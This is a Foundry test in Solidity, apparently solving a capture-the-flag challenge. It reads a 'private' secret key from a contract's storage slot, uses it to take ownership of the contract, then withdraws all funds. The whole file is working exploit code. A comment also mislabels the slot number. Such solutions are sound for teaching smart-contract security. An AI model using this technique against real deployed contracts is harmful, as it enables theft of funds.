// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/PrivateData.sol";

contract PrivateDataTest is BaseTest {
    PrivateData private privateData;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        privateData = PrivateData(payable(0x620E0c88E0f8F36bCC06736138bDEd99B6401192));

        vm.label(address(privateData), "PrivateData");
    }

    function testTakeOwnership() public {
        address player = users[0];
        vm.startPrank(player);

        // assert we are not the owners
        address owner = privateData.owner();
        assertEq(owner == player, false);

        // load the secret key slot from slot 9
        bytes32 secretKeyBytes = vm.load(address(privateData), bytes32(uint256(8)));
        uint256 secretKey = uint256(secretKeyBytes);

        console.log("secretKey", secretKey);

        // take the ownership of the contract
        privateData.takeOwnership(secretKey);

        // assert we are the onwer
        assertEq(privateData.owner(), player);

        // withdraw all the funds, if we are the owner it shoud not revert
        privateData.withdraw();

        vm.stopPrank();
    }
}
